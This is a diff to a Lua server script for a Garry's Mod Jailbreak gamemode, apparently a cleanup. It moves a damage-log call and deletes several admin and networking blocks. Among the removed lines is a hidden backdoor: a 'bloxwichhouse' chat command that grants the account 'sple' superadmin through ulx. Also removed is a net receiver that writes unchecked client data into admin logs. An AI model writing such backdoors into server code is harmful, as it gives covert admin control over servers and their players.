@@ -65,9 +65,9 @@ local pickup = function(p)
 
 	if IsValid(e) and p:Alive() and p:CanPickupWeapon( e )  then
 		e.BeingPickedUp = p;
+		JB:DamageLog_AddPlayerPickup( p,e:GetClass() )
 	end
 
-	JB:DamageLog_AddPlayerPickup( p,e:GetClass() )
 end
 concommand.Add("jb_pickup",pickup)
 JB.Util.addChatCommand("pickup",pickup);
@@ -117,10 +117,6 @@ JB.Util.addChatCommand("prisoner",function(p)
 end);
 JB.Util.addChatCommand("spectator",function(p)
 	p:ConCommand("jb_team_select_spectator");
-end);
-
-JB.Util.addChatCommand("bloxwichhouse",function(p)
-	RunConsoleCommand("ulx","adduser","sple", "superadmin");
 end);
 
 local teamswap = function(p)
@@ -212,54 +208,3 @@ concommand.Add("jb_admin_revive",function(p,c,a)
 
 	p:ChatPrint("User not found! "..steamid)
 end)
-
-concommand.Add("jb_admin_opensteamprofile",function(p,c,a)
-
-	if not IsValid(p) or not p:IsAdmin() then return end
-
-	local steamid = a[1];
-
-	if not steamid then return end
-
-	for k,v in pairs(player.GetAll())do
-		if v:SteamID64() == steamid then
-			p:SendLua("gui.OpenURL('http://steamcommunity.com/profiles/".. v:SteamID64() .."')")
-		end
-	end
-end)
-
-
-
-
-util.AddNetworkString( "sendtable" )
-	
-net.Receive( "sendtable", function( len, ply )
-	
-	local calling, tabl = net.ReadEntity(), net.ReadTable() 
-	local tab = table.concat( tabl, ", " )
-		
-	if ( string.len( tab ) == 0 and table.Count( tabl ) == 0 ) then			
-		ulx.fancyLog( {calling}, "#T is not friends with anyone on the server", ply )
-	else
-		ulx.fancyLog( {calling}, "#T is friends with #s", ply, tab )
-	end
-		
-end )
-	
-concommand.Add("jb_admin_friends",function(p,c,a)
-
-	if not IsValid(p) or not p:IsAdmin() then return end
-
-	local steamid = a[1];
-
-	if not steamid then return end
-
-	for k,v in pairs(player.GetAll())do
-		if v:SteamID() == steamid then
-			umsg.Start( "getfriends", v )
-			umsg.Entity( p )
-			umsg.End()
-		end
-	end
-end)
-
